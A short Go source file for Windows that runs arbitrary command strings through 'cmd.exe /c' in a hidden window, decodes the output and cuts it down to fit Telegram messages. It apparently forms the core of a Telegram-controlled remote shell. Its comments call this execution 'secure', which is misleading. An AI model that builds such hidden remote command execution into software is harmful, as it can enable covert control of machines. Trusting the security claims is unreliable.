package shell

import (
	"context"
	"fmt"
	"os/exec"
	"syscall"
	"time"
	"unsafe"
)

var (
	kernel32                = syscall.NewLazyDLL("kernel32.dll")
	procMultiByteToWideChar = kernel32.NewProc("MultiByteToWideChar")
)

func oemToUTF8(b []byte) string {
	if len(b) == 0 {
		return ""
	}
	// CP_OEMCP = 1
	ret, _, _ := procMultiByteToWideChar.Call(
		1, // CP_OEMCP
		0,
		uintptr(unsafe.Pointer(&b[0])),
		uintptr(len(b)),
		0,
		0,
	)
	if ret == 0 {
		return string(b)
	}

	buf := make([]uint16, ret)
	ret, _, _ = procMultiByteToWideChar.Call(
		1,
		0,
		uintptr(unsafe.Pointer(&b[0])),
		uintptr(len(b)),
		uintptr(unsafe.Pointer(&buf[0])),
		ret,
	)
	if ret == 0 {
		return string(b)
	}

	return syscall.UTF16ToString(buf)
}

// ExecuteCommand executes a command line string securely using cmd.exe /c
func ExecuteCommand(cmdLine string, timeout time.Duration) (string, error) {
	ctx, cancel := context.WithTimeout(context.Background(), timeout)
	defer cancel()

	// Run command inside cmd.exe /c securely
	cmd := exec.CommandContext(ctx, "cmd.exe", "/c", cmdLine)
	cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}

	outputBytes, err := cmd.CombinedOutput()
	output := oemToUTF8(outputBytes)

	if ctx.Err() == context.DeadlineExceeded {
		return fmt.Sprintf("%s\n[ERROR: Command execution timed out after %s]", output, timeout), context.DeadlineExceeded
	}

	// Limit output size to prevent bloating Telegram messages
	maxChars := 4000
	if len(output) > maxChars {
		output = output[:maxChars] + "\n... [Output truncated due to size limit]"
	}

	return output, err
}
